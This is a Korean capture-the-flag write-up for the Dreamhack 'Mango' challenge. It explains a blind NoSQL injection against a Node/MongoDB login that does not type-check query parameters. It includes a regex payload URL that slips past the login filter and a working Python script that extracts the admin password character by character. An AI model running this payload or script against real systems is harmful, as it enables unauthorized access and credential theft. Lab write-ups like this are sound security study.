## 📍Mango

```
이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다. 
플래그는 admin 계정의 비밀번호 입니다.
플래그의 형식은 DH{…} 입니다.
{‘uid’: ‘admin’, ‘upw’: ‘DH{32alphanumeric}’}
```

![](Attachments/{59F000E6-5B91-4D49-A479-B2B6D7D99E59}.png)

아래 주소를 URL에 붙여넣기하면 uid를 반환한다.

![](Attachments/{57BE0A16-BB46-42E5-95B7-ABB94716DE42}.png)

문제 지문에 나와있는 대로 admin 계정으로 로그인하려고 하면 막힌다.

![](Attachments/{4AD563C8-18A8-4CB7-A825-C7C3C234851F}.png)


#### 소스코드

`admin, dh, admi` 세 가지를 필터링하는 함수가 있다.
![](Attachments/{3C451C0B-EF1F-442B-94E6-12F733DB7BA0}.png)

login 페이지는 이용자가 쿼리로 전달한 `uid`와 `upw`를 `filter` 함수로 필터링한다.
필터링에 걸리지 않으면 DB를 검색하고, 찾아낸 이용자의 정보를 반환한다.
![](Attachments/{CA9A9A0A-5A2B-4C19-AA72-744CDFFCF8A8}.png)


#### 취약점

login 페이지에서 MongoDB에 쿼리를 전달하는 부분을 보면 쿼리 변수의 타입을 검사하지 않는다.
```sql
const {uid, upw} = req.query;

db.collection('user').findOne({
	'uid': uid,
	'upw': upw,
})
```
이로 인해 NoSQL Injection 공격이 발생할 수 있다.


#### 해결

/login에서는 로그인에 성공했을 때 이용자의 `uid`만 출력하기 때문에 Blind NoSQL Injection으로 admin의 `upw`를 획득해야 한다.

filter 함수가 특정 문자열을 필터링하고 있지만, 정규표현식을 이용하면 우회할 수 있다.

`http://host3.dreamhack.games:15768/login?uid[$regex]=ad.in&upw=D.{*`

![](Attachments/{6B39B63E-371A-4A54-A77B-FF313DE2C89E}.png)

`upw`는 정규표현식을 통해 한 글자씩 알아내야 하므로 여러 번 쿼리를 전달할 필요가 있다.
자동화 스크립트를 작성한다.

```python
import requests, string

HOST = 'http://host3.dreamhack.games:15768'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''

for i in range(32):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break
    print(f'FLAG: DH{{{flag}}}')
```

결과!

![](Attachments/{BA763E55-6627-4715-A8F6-2EAC91CE2E16}.png)
